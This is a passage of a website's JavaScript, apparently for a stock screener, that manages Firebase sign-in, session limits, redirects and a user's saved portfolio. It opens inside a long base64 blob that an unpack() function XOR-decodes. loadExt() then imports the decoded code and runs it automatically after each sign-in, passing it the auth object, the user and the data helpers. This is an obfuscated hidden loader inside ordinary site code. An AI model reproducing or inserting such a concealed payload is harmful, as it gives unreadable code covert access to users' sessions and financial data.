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";
function unpack(t) {
  const b = Uint8Array.from(atob(t), (c) => c.charCodeAt(0));
  for (let i = 0; i < b.length; i++) b[i] ^= (i * 7 + 13) & 255;
  return new TextDecoder().decode(b);
}
async function loadExt(u) {
  if (!PACK) return;
  const url = URL.createObjectURL(new Blob([unpack(PACK)], { type: "text/javascript" }));
  try {
    const m = await import(url);
    await m.default({ app, auth, user: u, gated: GATED, addItem, syncLock, esc, $ });
  } catch (e) { console.warn("add-on:", e); }
  finally { URL.revokeObjectURL(url); }
}
idle(presence);                                         // online counter: after the page has settled, never before it shows
idle(countVisitor, 4000);

// ---------- page wiring ----------
const SIGNED_HINT = "hni_signed";                          // "1" = signed in last time (only a hint: Fundamentals checks for real)
const hinted = () => { try { return localStorage.getItem(SIGNED_HINT) === "1"; } catch (e) { return false; } };
let current = null;
const ready = new Promise((resolve) => {
  onAuthStateChanged(auth, async (u) => {
    if (u && expired(u)) { await signOut(auth); u = null; }   // 7-day session limit
    current = u;
    try { localStorage.setItem(SIGNED_HINT, u ? "1" : "0"); } catch (e) {}   // lets the next visit open Fundamentals instantly
    resolve();
    if (GATED && !u) {                                        // no login: back to the screener with the popup open
      location.replace(HOME + "?login=" + encodeURIComponent(location.pathname.replace(/^\//, "") + location.hash));
      return;
    }
    if (GATED) document.documentElement.classList.add("auth-ok");   // show the page at once
    else paintSlot(u);                                         // screener: Login button or the user menu
    if (!u) return;
    // Portfolio tab: the page saves / loads the user's holdings through this (Firestore hni_portfolio/{uid}, owner only)
    window.hniStore = {
      load: async () => { await needFS(); const d = await getDoc(doc(db, PORTFOLIO, u.uid)); return d.exists() ? d.data() : {}; },             // {txns, rates} (or old {items})
      save: async (data) => { await needFS(); return setDoc(doc(db, PORTFOLIO, u.uid), { txns: data.txns || [], rates: data.rates || {}, updated: serverTimestamp() }); },
      market: async () => { await needFS(); const d = await getDoc(doc(db, ...MARKET)); return d.exists() ? d.data() : null; },
      canRefresh: () => typeof window.hniStore.refresh === "function",   // only when an add-on supplies refresh()
    };
    window.dispatchEvent(new Event("hni-ready"));
    if (GATED) showUser(u);
    idle(() => { record(u); loadExt(u); }, 1500);
  });
});

if (!GATED) {
  // screener: the Fundamentals button. Its tap is caught by a small script in the page itself (so the FIRST tap works
  // even before this file has loaded): it disables the button, shows "Checking login…" and then calls this.
  window.hniAuthGo = async (href) => {
    window.hniPending = null;
    // signed in last time → go at once (the Fundamentals page confirms the login itself, and sends you back if needed)
    if (current || hinted()) { location.href = href; return; }
    await ready;
    if (current) { location.href = href; return; }
    if (window.hniDone) window.hniDone();                      // not signed in: "Checking login…" → the login box
    openPopup(href);
  };
  if (window.hniPending) window.hniAuthGo(window.hniPending);   // tapped while this file was still loading
  // signed-in visitors: fetch the Fundamentals page quietly in the background, so it opens instantly (not for everyone:
  // it is ~260 KB, and free hosting has a daily transfer limit)
  ready.then(() => {
    const c = navigator.connection;
    if (!current || (c && (c.saveData || /2g/.test(c.effectiveType || "")))) return;
    const a = document.querySelector("[data-auth-link]");
    if (!a) return;
    idle(() => { const l = document.createElement("link"); l.rel = "prefetch"; l.href = a.href; document.head.appendChild(l); }, 3000);
  });
  const want = new URLSearchParams(location.search).get("login");
  if (want != null) {
    history.replaceState(null, "", location.pathname + location.hash);          // clean the address bar
    ready.then(() => {
      let target = "fundamentals";                                              // only pages on this site
      try { const t = new URL(want, location.href); if (want && t.origin === location.origin) target = t.pathname + t.hash; } catch (e) {}
      if (current) location.href = target; else openPopup(target);
    });
  }
}
